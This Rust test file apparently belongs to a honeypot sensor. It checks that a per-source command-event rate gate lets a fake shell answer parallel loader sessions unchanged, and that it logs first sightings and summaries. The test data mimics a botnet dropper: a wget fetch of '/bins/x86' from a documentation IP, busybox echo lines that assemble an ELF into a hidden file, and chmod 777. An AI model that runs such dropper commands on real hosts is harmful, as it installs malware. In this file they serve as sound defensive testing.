//! The per-source command-event budget seen from the shell: several loader sessions running at
//! once from one network, line by line in turn, with and without the gate. The gate may only
//! change which command events are written; every reply, every download event and every
//! non-command event stays exactly as it was.

use std::net::IpAddr;
use std::num::NonZeroU32;
use std::sync::Arc;

use sensor_framework::fakefs::FakeFs;
use sensor_framework::shell::{EmitContext, FakeShell};
use sensor_framework::{
    BudgetLimits, CommandEventConfig, CommandEventGate, ConnectionBudget, Rate, Uuid,
};
use sensor_wire::{SIGNAL_HONEYPOT_COMMAND_EXEC, SIGNAL_HONEYPOT_FILE_DOWNLOAD, SensorEvent};

const LOADER: &str = "198.51.100.7";
const BYSTANDER: &str = "203.0.113.20";
const BURST: u32 = 40;

/// Fifty-three lines in the shape of the observed loader: preamble, probes, a fetch, and the
/// upload as `echo` chunks into one file.
fn session() -> Vec<String> {
    let mut lines: Vec<String> = [
        "enable",
        "system",
        "shell",
        "sh",
        "cd /tmp",
        "/bin/busybox ECCHI",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    lines.push("wget http://198.51.100.23/bins/x86 -O- > .d".to_string());
    lines.push("/bin/busybox echo -ne '\\x7f\\x45\\x4c\\x46' > .i".to_string());
    for i in 0..44u8 {
        lines.push(format!(
            "/bin/busybox echo -ne '\\x{i:02x}\\x{:02x}' >> .i",
            i.wrapping_mul(7)
        ));
    }
    lines.push("chmod 777 .i".to_string());
    assert_eq!(lines.len(), 53);
    lines
}

fn shell(source: &str, gate: Option<&Arc<CommandEventGate>>) -> FakeShell {
    let ctx = EmitContext {
        source_ip: source.parse::<IpAddr>().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "telnet".into(),
        session_id: Some(Uuid::now_v7()),
    };
    let budget = match gate {
        Some(gate) => ConnectionBudget::with_command_gate(BudgetLimits::standard(), gate.clone()),
        None => ConnectionBudget::new(BudgetLimits::standard()),
    };
    FakeShell::new(FakeFs::new(), ctx).with_budget(budget)
}

/// Every reply and every event of `parallel` sessions from `source`, run `rounds` times, with
/// each round's sessions interleaved one line at a time.
fn run(
    source: &str,
    gate: Option<&Arc<CommandEventGate>>,
    rounds: usize,
    parallel: usize,
) -> (Vec<Vec<u8>>, Vec<SensorEvent>) {
    let lines = session();
    let (mut replies, mut events) = (Vec::new(), Vec::new());
    for _ in 0..rounds {
        let mut shells: Vec<FakeShell> = (0..parallel).map(|_| shell(source, gate)).collect();
        for line in &lines {
            for sh in &mut shells {
                let (output, evs) = sh.handle_input(line);
                replies.push(output.into_bytes());
                events.extend(evs);
            }
        }
    }
    (replies, events)
}

fn commands(events: &[SensorEvent]) -> Vec<&SensorEvent> {
    events
        .iter()
        .filter(|e| e.signal_type == SIGNAL_HONEYPOT_COMMAND_EXEC)
        .collect()
}

fn others(events: &[SensorEvent]) -> Vec<(String, serde_json::Value)> {
    events
        .iter()
        .filter(|e| e.signal_type != SIGNAL_HONEYPOT_COMMAND_EXEC)
        .map(|e| (e.signal_type.clone(), e.metadata.clone()))
        .collect()
}

#[test]
fn parallel_loader_sessions_past_the_budget_change_only_which_command_events_are_written() {
    let gate = Arc::new(CommandEventGate::new(CommandEventConfig {
        rate: Rate::new(NonZeroU32::MIN, NonZeroU32::new(BURST).unwrap()),
        ..CommandEventConfig::default()
    }));
    let (rounds, parallel) = (3, 4);
    let (plain_replies, plain_events) = run(LOADER, None, rounds, parallel);
    let started = std::time::Instant::now();
    let (gated_replies, gated_events) = run(LOADER, Some(&gate), rounds, parallel);
    let refill = started.elapsed().as_secs() as usize + 1;

    assert_eq!(
        gated_replies, plain_replies,
        "every command is answered the same"
    );
    assert_eq!(
        others(&gated_events),
        others(&plain_events),
        "downloads and every other event are untouched"
    );
    let downloads = gated_events
        .iter()
        .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .count();
    assert_eq!(downloads, rounds * parallel);

    let total = session().len() * rounds * parallel;
    let plain = commands(&plain_events);
    assert_eq!(plain.len(), total, "no gate, one event per command");
    let gated = commands(&gated_events);
    // The upload chunks (the `> .i` and `>> .i` echo lines) are never first sightings; every other
    // line is one shape of its own.
    let firsts: Vec<String> = session()
        .into_iter()
        .filter(|line| !line.contains("echo -ne"))
        .collect();
    assert_eq!(firsts.len(), 8);
    // The whole run is well inside one window: the burst, one first sighting per shape, and one
    // token a second.
    assert!(
        gated.len() <= BURST as usize + firsts.len() + refill,
        "{} individual events",
        gated.len()
    );
    for line in &firsts {
        assert!(
            gated.iter().any(|e| e.metadata["command"] == line.as_str()),
            "first sighting logged: {line}"
        );
    }
    // What was written is what an ungated sensor writes for the same command, field for field.
    for e in &gated {
        assert!(
            plain.iter().any(|p| p.metadata == e.metadata),
            "{:?}",
            e.metadata
        );
    }

    let summaries = gate.drain();
    assert_eq!(summaries.len(), 1);
    let s = &summaries[0];
    assert_eq!(s.count as usize + gated.len(), total);
    // Eight first-sighting shapes and the two chunk forms (`> .i`, `>> .i`).
    assert_eq!(s.distinct_commands, 10);
    // Every session wrote chunks past the burst.
    assert_eq!(s.sessions, rounds * parallel);
    assert_eq!(s.assembled_file.as_deref(), Some("/tmp/.i"));
    assert_eq!(s.max_chunk_index, Some(45));

    // Another network running the same loop meanwhile has its own whole budget: its burst, not
    // the loader's empty bucket.
    let (_, bystander) = run(BYSTANDER, Some(&gate), 1, 1);
    assert!(commands(&bystander).len() > BURST as usize);
}
